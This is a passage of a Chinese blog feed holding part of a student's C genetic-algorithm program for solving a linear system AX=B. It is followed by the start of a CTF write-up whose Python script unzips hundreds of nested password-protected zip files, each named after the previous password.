&#123;//交叉中</span><br><span class="line">gen_new[k].info[c] = ((1.0-A)*gen_group[i].info[c]+(1.0*A)*gen_group[j].info[c]);</span><br><span class="line">gen_new[k+1].info[c] = ((1.0-A) * gen_group[j].info[c] + ( 1.0*A) * gen_group[i].info[c]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k = k + 2;</span><br><span class="line">&#125;</span><br><span class="line">else //物理交换</span><br><span class="line">&#123;</span><br><span class="line">for (c = 1;c &amp;lt;=x;c++) &#123;//交叉中</span><br><span class="line">gen_new[k].info[c] = gen_group[i].info[c];</span><br><span class="line">gen_new[k + 1].info[c] = gen_group[j].info[c];</span><br><span class="line">&#125;</span><br><span class="line">for (c = x + 1;c &amp;lt;= length;c++) &#123;</span><br><span class="line">gen_new[k].info[c] = gen_group[j].info[c];</span><br><span class="line">gen_new[k + 1].info[c] = gen_group[i].info[c];</span><br><span class="line">&#125;</span><br><span class="line">k = k + 2;</span><br><span class="line">&#125;</span><br><span class="line">a[i] = a[j] = 1;//进行过交叉 </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">float  f(gen G) &#123;         //计算||AX-B||的无穷范数   提供gen[x].    B的数值   A的所有数值</span><br><span class="line"> int i, j;</span><br><span class="line">float  sum = 0;</span><br><span class="line">float  max = 0;</span><br><span class="line">i = j = 1;</span><br><span class="line">node* p, * q;</span><br><span class="line">p = head1;</span><br><span class="line">//printf(&quot;19&quot;);</span><br><span class="line">q = head2;</span><br><span class="line">while (q != NULL&amp;amp;&amp;amp;i&amp;lt;length) &#123;</span><br><span class="line">while (p-&amp;gt;row == i&amp;amp;&amp;amp;p!=NULL) &#123;//按行进行计算  第i列对应x的第p-&amp;gt;col行    乘积相加  再将结果减去B对应的值   q-&amp;gt;date  //i&amp;lt;=196608</span><br><span class="line">sum =sum+1.0*p-&amp;gt;date * 1.0*G.info[p-&amp;gt;col]*1.0;</span><br><span class="line">p = p-&amp;gt;next;</span><br><span class="line">&#125;</span><br><span class="line">i++;//下一行</span><br><span class="line">sum -= (q-&amp;gt;date)*1.0;//AX-B b的值是依次排列的</span><br><span class="line">if (sum &amp;lt; 0) &#123;//绝对值</span><br><span class="line">sum = -sum;</span><br><span class="line">&#125;</span><br><span class="line">//printf(&quot;19&quot;);</span><br><span class="line">q = q-&amp;gt;next;</span><br><span class="line">if (sum &amp;gt; max) &#123;</span><br><span class="line">max = sum;//max的理想状态应该是0</span><br><span class="line">&#125;</span><br><span class="line">sum=0; //重置sum计算下一个</span><br><span class="line">if (p == NULL||q==NULL) &#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return max;</span><br><span class="line">&#125;</span><br><span class="line">void evaluation(int flag)//评估种群中各染色体的适应度，并据此进行排序 </span><br><span class="line">&#123;</span><br><span class="line">int i, j;</span><br><span class="line">printf(&quot;333\n&quot;);</span><br><span class="line">struct gen* genp;</span><br><span class="line">struct gen * genp2;</span><br><span class="line">genp2 = (struct gen*)malloc(sizeof(gen));</span><br><span class="line">//float gentsuitability;</span><br><span class="line">//float x;</span><br><span class="line">int x;</span><br><span class="line">float k;</span><br><span class="line">if (flag == 0)// flag=0的时候对父种群进行操作 ///genp = gen_group;</span><br><span class="line">&#123;</span><br><span class="line">for (i = 0; i &amp;lt; SUM; i++)//计算各染色体对应的表达式值</span><br><span class="line">&#123;</span><br><span class="line">gen_group[i].suitability = 10000.0 / (1.0 + f(gen_group[i]));     //在f最小  f=0时取最大值 大到小排序  f越小越接近理想值 即适应度越高</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;999&quot;);</span><br><span class="line">for (i = 0; i &amp;lt; SUM - 1; i++)//按表达式的值进行排序，</span><br><span class="line">&#123;</span><br><span class="line">for (j = i + 1; j &amp;lt; SUM; j++)</span><br><span class="line">&#123;</span><br><span class="line">if (gen_group[i].suitability &amp;lt; gen_group[j].suitability)//对应的函数值进行比较 交换从大到小冒泡排序</span><br><span class="line">&#123;</span><br><span class="line">for (int i1 = 1;i1 &amp;lt;= length;i1++) &#123;</span><br><span class="line">k = gen_group[i].info[i1];</span><br><span class="line">gen_group[i].info[i1] = gen_group[j].info[i1];</span><br><span class="line">gen_group[j].info[i1] = k;</span><br><span class="line">&#125;</span><br><span class="line">k = gen_group[i].suitability;</span><br><span class="line">gen_group[i].suitability = gen_group[j].suitability;</span><br><span class="line">gen_group[j].suitability = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else if(flag==1)//genp = gen_new;</span><br><span class="line">&#123;</span><br><span class="line">for (i = 0; i &amp;lt; SUM; i++)//计算各染色体对应的表达式值</span><br><span class="line">&#123;</span><br><span class="line">gen_new[i].suitability =10000.0/(1.0+ f(gen_new[i]));     //在f最小  f=0时取最大值 大到小排序</span><br><span class="line">&#125; </span><br><span class="line">//printf(&quot;9&quot;);</span><br><span class="line">for (i = 0; i &amp;lt; SUM - 1; i++)//按表达式的值进行排序，</span><br><span class="line">&#123;</span><br><span class="line">for (j = i + 1; j &amp;lt; SUM; j++)</span><br><span class="line">&#123;</span><br><span class="line">if (gen_new[i].suitability &amp;lt; gen_new[j].suitability)//对应的函数值进行比较 交换从大到小冒泡排序 </span><br><span class="line">&#123;</span><br><span class="line">for (int i1 = 1;i1 &amp;lt;= length;i1++) &#123;</span><br><span class="line">k = gen_new[i].info[i1];</span><br><span class="line">gen_new[i].info[i1] = gen_new[j].info[i1];</span><br><span class="line">gen_new[j].info[i1] = k;</span><br><span class="line">&#125;</span><br><span class="line">k = gen_new[i].suitability;</span><br><span class="line">gen_new[i].suitability = gen_new[j].suitability;</span><br><span class="line">gen_new[j].suitability = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">free(genp2);</span><br><span class="line">&#125;</span><br><span class="line">void selection(int x)//选择函数 选择以后的种群是有序</span><br><span class="line">&#123;</span><br><span class="line">int i, j, k;</span><br><span class="line">j = 0;</span><br><span class="line">i = SUM / 2 - 1;//i=9 </span><br><span class="line">printf(&quot;11&quot;);</span><br><span class="line">if (x == 1)</span><br><span class="line">&#123;</span><br><span class="line">for (i = 0;i &amp;lt;= SUM/2-5;i++) &#123;</span><br><span class="line">for (j = 1;j &amp;lt;= length;j++)</span><br><span class="line">&#123;</span><br><span class="line">gen_group[SUM/2-1+ i].info[j] = gen_yi[i*2].info[j];</span><br><span class="line">&#125; </span><br><span class="line">gen_group[SUM/2-1+ i].suitability = gen_yi[i*2].suitability;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else if (x == 0) //genp = gen_new;</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">for (i = 0;i &amp;lt;=SUM/4;i++) &#123;</span><br><span class="line">for (j = 1;j &amp;lt;= length;j++)</span><br><span class="line">&#123;</span><br><span class="line">gen_group[i+SUM/4].info[j] = gen_new[i].info[j];</span><br><span class="line">&#125;</span><br><span class="line">gen_group[i+SUM/4].suitability = gen_new[i].suitability;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int record()//记录最优解和判断是否满足条件      14.662757</span><br><span class="line">&#123;</span><br><span class="line">float x;</span><br><span class="line">if (gen_group[0].suitability- 10000.0&amp;lt;=100&amp;amp;&amp;amp; gen_group[0].suitability - 10000.0 &amp;gt;=-100)</span><br><span class="line">return 1;</span><br><span class="line">x = gen_result.suitability - gen_group[0].suitability;//最优的染色体和gen0的差值 </span><br><span class="line">if (x &amp;lt; 0)x = -x;</span><br><span class="line">if (x &amp;lt; error)//若两次最优值之差小于此数则认为结果没有改变</span><br><span class="line">&#123;</span><br><span class="line">result_unchange_time++;//没有改变 </span><br><span class="line">if (result_unchange_time &amp;gt;= 100000)</span><br><span class="line">return 1;//连续100次无改变 满足条件 </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">gen_result = gen_group[0];</span><br><span class="line">gen_result.suitability = gen_group[0].suitability;</span><br><span class="line">result_unchange_time = 0;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">void mutation()//变异函数 变异概率mp=0.04</span><br><span class="line">&#123;</span><br><span class="line">int i, j;</span><br><span class="line">int k = 1;</span><br><span class="line">float gmp;</span><br><span class="line">float k1=0;</span><br><span class="line">struct gen* gen2 = (gen*)malloc(sizeof(gen));</span><br><span class="line">//gmp = 1 - pow(1 - mp, 11);//在基因变异概率为mp时整条染色体的变异概率  mp 0.04           //变异概率 gmp=1-(0.96)^11</span><br><span class="line">for (i = 0;i &amp;lt;= SUM - 1;i++) &#123;</span><br><span class="line">for (j = 1;j &amp;lt;= length;j++) &#123;</span><br><span class="line">gen_yi[i].info[j] = gen_group[i].info[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for (i = 0; i &amp;lt; SUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">for (j = 0;j &amp;lt;=length/3;j++) </span><br><span class="line">&#123;</span><br><span class="line">k = randNext(1, length);</span><br><span class="line">gen_yi[i].info[k] = 1.0*randNext(0, 50000)/1000.0;//变异 </span><br><span class="line">&#125;</span><br><span class="line"> gen_yi[i].suitability = 10000.0/(1.0+1.0*f(gen_yi[i]));</span><br><span class="line">&#125;</span><br><span class="line">for (i = 0; i &amp;lt; SUM - 1; i++)//重新排序</span><br><span class="line">&#123;</span><br><span class="line">for (j = i + 1; j &amp;lt; SUM; j++)</span><br><span class="line">&#123;</span><br><span class="line">if (gen_yi[i].suitability &amp;lt; gen_yi[j].suitability)</span><br><span class="line">&#123;</span><br><span class="line">for (int i1 = 1;i1 &amp;lt;= length;i1++) &#123;</span><br><span class="line">k1 = gen_yi[i].info[i1];</span><br><span class="line">gen_yi[i].info[i1] = gen_yi[j].info[i1];</span><br><span class="line">gen_yi[j].info[i1] = k1;</span><br><span class="line">&#125;</span><br><span class="line"> k1= gen_yi[i].suitability;</span><br><span class="line">gen_yi[i].suitability = gen_yi[j].suitability;</span><br><span class="line">gen_yi[j].suitability = k1；</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//printf(&quot;12\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">node* createList(char str[]);//读数据 </span><br><span class="line">void destroyList(node* head);</span><br><span class="line">void suanfa(node* head1, node* head2);</span><br><span class="line">//Mat image(Size(4, 1), CV_8UC3,Scalar(255, 255, 255));</span><br><span class="line">void sort() &#123;</span><br><span class="line">int i, j;</span><br><span class="line">int x;</span><br><span class="line">float k;</span><br><span class="line">gen* genp2 = (struct gen*)malloc(sizeof(gen));</span><br><span class="line">for (i = 0; i &amp;lt; SUM - 1; i++)//按表达式的值进行排序，</span><br><span class="line">&#123;</span><br><span class="line">for (j = i + 1; j &amp;lt; SUM; j++)</span><br><span class="line">&#123;</span><br><span class="line">if (gen_group[i].suitability &amp;lt;gen_group[j].suitability)//对应的函数值进行比较 交换从大到小冒泡排序 </span><br><span class="line">&#123;</span><br><span class="line">for (int i1 = 1;i1 &amp;lt;= length;i1++) &#123;</span><br><span class="line">k = gen_group[i].info[i1];</span><br><span class="line">gen_group[i].info[i1] = gen_group[j].info[i1];</span><br><span class="line">gen_group[j].info[i1] = k;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">k = gen_group[i].suitability;</span><br><span class="line">gen_group[i].suitability = gen_group[j].suitability;</span><br><span class="line">gen_group[j].suitability = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">free(genp2);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i, flag;</span><br><span class="line">char str1[] = &quot;A.txt&quot;;</span><br><span class="line">char str2[] = &quot;B.txt&quot;;</span><br><span class="line">//printf(&quot;1&quot;);</span><br><span class="line">head1 = createList(str1);//A</span><br><span class="line">head2 = createList(str2);//B</span><br><span class="line">//printf(&quot;19&quot;);</span><br><span class="line">//以下是遗传算法的内容</span><br><span class="line">&#123;</span><br><span class="line">initiate();//产生初始化种群 </span><br><span class="line">printf(&quot;19&quot;);</span><br><span class="line">evaluation(0);//对初始化种群进行评估、排序</span><br><span class="line">printf(&quot;15&quot;);</span><br><span class="line">for (i = 0; i &amp;lt; MAXloop; i++)//MAXloop 1200</span><br><span class="line">    &#123;</span><br><span class="line">cross();//进行交叉操作 产生new</span><br><span class="line">printf(&quot;19&quot;);</span><br><span class="line">evaluation(1);//对子种群进行评估、排序 对new排序</span><br><span class="line">selection(0);//对父子种群中选择最优的NUM个作为新的父种群 </span><br><span class="line">sort();</span><br><span class="line">printf(&quot;19&quot;);</span><br><span class="line">if (record() == 1)//满足终止规则1，则flag=1并停止循环 </span><br><span class="line">&#123;</span><br><span class="line">flag = 1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;19&quot;);</span><br><span class="line">mutation();//变异操作  自带评估排序功能</span><br><span class="line">selection(1);//对父子种群中选择最优的NUM个作为新的父种群</span><br><span class="line">sort();</span><br><span class="line">//if (i % 10 == 0)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;\n number = %d  \n&quot;, i);</span><br><span class="line">printf(&quot; \ngengroup  %f  %f  %f\n&quot;, gen_group[0].suitability,gen_group[SUM/2].suitability,gen_group[SUM-1].suitability);</span><br><span class="line">printf(&quot; \ngenyi  %f  %f  %f\n&quot;, gen_yi[0].suitability,gen_yi[SUM/2].suitability, gen_yi[SUM - 1].suitability);</span><br><span class="line">printf(&quot; \ngennew  %f   %f %f\n&quot;, gen_new[0].suitability,gen_new[SUM/2].suitability, gen_new[SUM - 1].suitability);</span><br><span class="line">printf(&quot;\n gen_result %f  \n&quot;, gen_result.suitability);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">suanfa(head1, head2);</span><br><span class="line">destroyList(head1);</span><br><span class="line">destroyList(head2);</span><br><span class="line">//imwrite(&quot;X.jpg&quot;, image);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">node* createList(char str[])//读文件</span><br><span class="line">&#123;</span><br><span class="line">FILE* fp;</span><br><span class="line">fp = fopen(str, &quot;r&quot;);</span><br><span class="line">node* p, * q, * head;</span><br><span class="line">head = (node*)malloc(sizeof(node));</span><br><span class="line">q = head;</span><br><span class="line">int rows, cols, udate;</span><br><span class="line">printf(&quot;%c&quot;, fgetc(fp));</span><br><span class="line">while (!feof(fp))</span><br><span class="line">&#123;</span><br><span class="line">fscanf(fp, &quot;%d&quot;, &amp;amp;rows);</span><br><span class="line">fgetc(fp);</span><br><span class="line">fgetc(fp);</span><br><span class="line">fscanf(fp, &quot;%d&quot;, &amp;amp;cols);</span><br><span class="line">if (cols &amp;gt; length) cols = length;</span><br><span class="line">fgetc(fp);</span><br><span class="line">fgetc(fp);</span><br><span class="line">fscanf(fp, &quot;%d&quot;, &amp;amp;udate);</span><br><span class="line">fgetc(fp);</span><br><span class="line">fgetc(fp);</span><br><span class="line">fgetc(fp);</span><br><span class="line">p = (node*)malloc(sizeof(node));</span><br><span class="line">p-&amp;gt;col = cols;</span><br><span class="line">p-&amp;gt;row = rows;</span><br><span class="line">p-&amp;gt;date = udate;</span><br><span class="line">q-&amp;gt;next = p;</span><br><span class="line">q = p;</span><br><span class="line">&#125;</span><br><span class="line">q-&amp;gt;next = NULL;</span><br><span class="line">q = head;</span><br><span class="line">head = head-&amp;gt;next;</span><br><span class="line">free(q);</span><br><span class="line">return head;</span><br><span class="line">&#125;</span><br><span class="line">void destroyList(node* head) </span><br><span class="line">&#123;</span><br><span class="line">node* p, * q;</span><br><span class="line">for (p = head; p != NULL;)</span><br><span class="line">&#123;</span><br><span class="line">q = p;</span><br><span class="line">p = p-&amp;gt;next;</span><br><span class="line">free(q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">char* my_itoa(char* str, int num)//局部变量，出了作用域释放</span><br><span class="line">&#123;</span><br><span class="line">int i = 0;</span><br><span class="line">while (num != 0)</span><br><span class="line">&#123;</span><br><span class="line">str[i] = num % 10 + &#x27;0&#x27;;//得到字符串“3 2 1”</span><br><span class="line">num = num / 10;//num == 0</span><br><span class="line">i++;//i == 3</span><br><span class="line">&#125;</span><br><span class="line">str[i] = &#x27;\0&#x27;;//str[3]</span><br><span class="line">i--;</span><br><span class="line">for (int j = 0; j &amp;lt; i; j++, i--)</span><br><span class="line">&#123;</span><br><span class="line">char ch = str[j];//0号下标的元素赋给ch</span><br><span class="line">str[j] = str[i];//2号下标的元素赋给0号下标==》str【】==121</span><br><span class="line">str[i] = ch;//把3赋给2号下标</span><br><span class="line">&#125;</span><br><span class="line">return str;</span><br><span class="line">&#125;</span><br><span class="line">void suanfa(node* head1, node* head2)</span><br><span class="line">&#123;</span><br><span class="line">//FILE* fp;</span><br><span class="line">int i，j;</span><br><span class="line">float sum;</span><br><span class="line">node* p, * q;</span><br><span class="line">char ss[10];</span><br><span class="line">//使用遗传算法内容</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">for (int i = 1;i &amp;lt;= length;i++) &#123;</span><br><span class="line">X[i-1] = gen_group[0].info[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;\nit is %f\n&quot;, gen_group[0].suitability);</span><br><span class="line"> char s[8] = &quot;&quot;;</span><br><span class="line"></span><br><span class="line"> FILE* fp;//遗传算法</span><br><span class="line"> fp = fopen(&quot;X.txt&quot;, &quot;w&quot;);</span><br><span class="line"> if (fp == NULL)</span><br><span class="line"> &#123;</span><br><span class="line"> printf(&quot;文件打开失败\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> for (int i = 0; i &amp;lt; length; i++)</span><br><span class="line"> &#123;</span><br><span class="line"> //fputs(my_itoa(s, X[i]), fp);</span><br><span class="line"> sprintf(ss, &quot;%f&quot;, X[i]); // double 到 char </span><br><span class="line"> fputs(ss, fp);</span><br><span class="line"> fputs(&quot;\n&quot;, fp);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> fclose(fp);</span><br><span class="line"></span><br><span class="line"> float sum2 = 0;</span><br><span class="line"> float  max = 0;</span><br><span class="line"> int j;</span><br><span class="line"> int  i = j = 1;</span><br><span class="line"> p = head1;</span><br><span class="line"> //printf(&quot;19&quot;);</span><br><span class="line"> q = head2;</span><br><span class="line"> while (q != NULL &amp;amp;&amp;amp; i &amp;lt; length) &#123;</span><br><span class="line"> while (p-&amp;gt;row == i &amp;amp;&amp;amp; p != NULL) &#123;//按行进行计算  第i列对应x的第p-&amp;gt;col行    乘积相加  再将结果减去B对应的值   q-&amp;gt;date  //i&amp;lt;=196608</span><br><span class="line"> sum2 = sum2 + 1.0 * p-&amp;gt;date * 1.0 * X[p-&amp;gt;col -1] * 1.0;</span><br><span class="line"> p = p-&amp;gt;next;</span><br><span class="line"> &#125;</span><br><span class="line"> i++;//下一行</span><br><span class="line"> sum2 -= (q-&amp;gt;date) * 1.0;//AX-B b的值是依次排列的</span><br><span class="line"> if (sum2 &amp;lt; 0) &#123;//绝对值</span><br><span class="line"> sum2 = -sum2;</span><br><span class="line"> printf(&quot; \n sum2 %f \n&quot;, sum2);</span><br><span class="line"> &#125;</span><br><span class="line"> q = q-&amp;gt;next;</span><br><span class="line"> printf(&quot; \n sum2 %f \n&quot;, sum2);</span><br><span class="line"> if (sum2 &amp;gt; max) &#123;</span><br><span class="line"> max = sum2;//max的理想状态应该是0</span><br><span class="line"> //printf(&quot;\n\n max  %f   \n\n&quot;, max);</span><br><span class="line"> &#125;</span><br><span class="line"> sum2 = 0; //重置sum2计算下一个</span><br><span class="line"> if (p == NULL || q == NULL) &#123;</span><br><span class="line"> break;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> printf(&quot;\n\n max  %f   \n\n&quot;, max);</span><br><span class="line">//不使用遗传算法的内容</span><br><span class="line">  FILE* fp2;</span><br><span class="line">  fp2 = fopen(&quot;X2.txt&quot;, &quot;w&quot;);</span><br><span class="line">memset(X, 0, sizeof(X));</span><br><span class="line">memset(a, 0, sizeof(a));</span><br><span class="line">p = head1;</span><br><span class="line">float flag;</span><br><span class="line">q = head2;</span><br><span class="line">for (int j = 0; j &amp;lt;length;j++)</span><br><span class="line">&#123;</span><br><span class="line">sum = 0;</span><br><span class="line">while (p-&amp;gt;row == j + 1)</span><br><span class="line">&#123;</span><br><span class="line">if (j + 1 == p-&amp;gt;col)</span><br><span class="line">&#123;</span><br><span class="line">flag =1.0* p-&amp;gt;date;</span><br><span class="line">p = p-&amp;gt;next;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">sum += (-1) * p-&amp;gt;date * X[p-&amp;gt;col - 1];</span><br><span class="line">p = p-&amp;gt;next;</span><br><span class="line">&#125;</span><br><span class="line">if (p == NULL)</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">a[j] = X[j] = (sum + q-&amp;gt;date) / flag;</span><br><span class="line">q = q-&amp;gt;next;</span><br><span class="line">&#125;</span><br><span class="line">if (fp2 == NULL)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;文件打开失败\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">for (int i = 0; i &amp;lt; length; i++)</span><br><span class="line">&#123;</span><br><span class="line">sprintf(ss, &quot;%f&quot;, X[i]); // double 到 char </span><br><span class="line">fputs(ss, fp2);</span><br><span class="line">fputs(&quot;\n&quot;, fp2);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp2);</span><br><span class="line">p = head1;</span><br><span class="line">q = head2;</span><br><span class="line">max = 0;</span><br><span class="line">i = j = 1;</span><br><span class="line">sum2 = 0;</span><br><span class="line">printf(&quot;不使用遗传算法&quot;);</span><br><span class="line">while (q != NULL &amp;amp;&amp;amp; i &amp;lt; length) &#123;</span><br><span class="line">while (p-&amp;gt;row == i &amp;amp;&amp;amp; p != NULL) &#123;//按行进行计算  第i列对应x的第p-&amp;gt;col行    乘积相加  再将结果减去B对应的值   q-&amp;gt;date  //i&amp;lt;=196608</span><br><span class="line">sum2 = sum2 + 1.0 * p-&amp;gt;date * 1.0 * X[p-&amp;gt;col - 1] * 1.0;</span><br><span class="line">p = p-&amp;gt;next;</span><br><span class="line">&#125;</span><br><span class="line">i++;//下一行</span><br><span class="line">sum2 -= (q-&amp;gt;date) * 1.0;//AX-B b的值是依次排列的</span><br><span class="line">if (sum2 &amp;lt; 0) &#123;//绝对值</span><br><span class="line">sum2 = -sum2;</span><br><span class="line">printf(&quot; \n sum2 %f \n&quot;, sum2);</span><br><span class="line">&#125;</span><br><span class="line">q = q-&amp;gt;next;</span><br><span class="line">printf(&quot;\n  sum   %f  \n&quot;, sum2);</span><br><span class="line">if (sum2 &amp;gt; max) &#123;</span><br><span class="line">max = sum2;//max的理想状态应该是0</span><br><span class="line">//printf(&quot;\n\n max  %f   \n\n&quot;, max);</span><br><span class="line">&#125;</span><br><span class="line">sum2 = 0; //重置sum2计算下一个</span><br><span class="line">if (p == NULL || q == NULL) &#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n\n max  %f   \n\n&quot;, max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用该方法<br> 达到的精确度可以到小数点后两位。</p>]]></content>
      
      
      <categories>
          
          <category> acm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生，acm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归解压zip文件</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E9%80%92%E5%BD%92%E8%A7%A3%E5%8E%8Bzip%E6%96%87%E4%BB%B6/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E9%80%92%E5%BD%92%E8%A7%A3%E5%8E%8Bzip%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  递归解压zip文件</p><h1 id="递归解压zip文件"><a href="#递归解压zip文件" class="headerlink" title="递归解压zip文件"></a>递归解压zip文件</h1><h2 id="此代码解决的问题是-套娃"><a href="#此代码解决的问题是-套娃" class="headerlink" title="此代码解决的问题是 套娃"></a>此代码解决的问题是 <strong>套娃</strong></h2><p>某一题CTF就是把一个文本文件压缩了几百次，套在几百个zip文件里面。几乎不能想象。<br> 在此处，还没有想到问题的 严重性。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210412200050363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <strong>已知，解压的密码就是上一个zip的文件名。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">dir = &quot;C:\\Users\\brighten\\Desktop\\ff\\&quot;</span><br><span class="line"></span><br><span class="line">n = 0</span><br><span class="line">s2 = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def jieya():</span><br><span class="line">    i = &quot;0653.zip&quot;</span><br><span class="line">    for x in range(10000):</span><br><span class="line">        ss = i[:i.find(&quot;.&quot;)]</span><br><span class="line">        print(i)</span><br><span class="line">        zpf = zipfile.ZipFile(dir + ss + &quot;.zip&quot;)</span><br><span class="line">        list = zpf.namelist()  # 得到压缩包里所有文件</span><br><span class="line">        for f in list:</span><br><span class="line">            zpf.extract(f, dir, ss.encode(&#x27;utf-8&#x27;))  # 循环解压文件到指定目录，密码</span><br><span class="line">        print(ss + &quot;解压成功&quot; + str(f))</span><br><span class="line">        i = str(f)</span><br><span class="line"></span><br><span class="line">#这里注释掉的代码是一个字典，记录重复的文件名，没有用</span><br><span class="line">&#x27;&#x27;&#x27;t = &#123;&#125;</span><br><span class="line">for i in range(10000):</span><br><span class="line">    s = str(i)</span><br><span class="line">    while len(s) &amp;lt; 4:</span><br><span class="line">        s = &#x27;0&#x27; + s</span><br><span class="line">    t[s] = False&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">jieya()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里写代码的时候有一个误区，就是以为他的文件名是不重复的，就去设置了一个字典。</p><p>但是后来发现，这样的结果是最后会停止执行，而且的确程序是正常执行的。</p><p>原因就是文件名有重复的，后解压的文件会有一部分文件名和原有文件名相同。就是自己加条件的问题，值得反思。</p><p>这个问题主要的点在于编写程序。<br> 但是每一个解压，会有一个新的文件出现在dir目录下。<br> 本来的想法是直接硬来，把全部的文件重新解压，但是这样的复杂度就挺高的，还可能会有一些错误。</p><p>最后的解决方法是类似一个斐波那契数列的思想。</p><p>把解出来的压缩包名称传递给一个<strong>变量i</strong></p><p>对i再解压。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210412200742286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 最后是得到了一个文本文件，里面是三联组的像素表示。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210412200848454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 目测是200*200的二维码</p><p>这个作图还是很简单的，基础图像处理</p><h2 id="做图"><a href="#做图" class="headerlink" title="做图"></a>做图</h2><p>单单是做这样一张图，用这种偷懒的方法就可以了</p><p>但是还是最好做成RGB的图，这样的程序的使用频率要高一点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import cv2 as cv</span><br><span 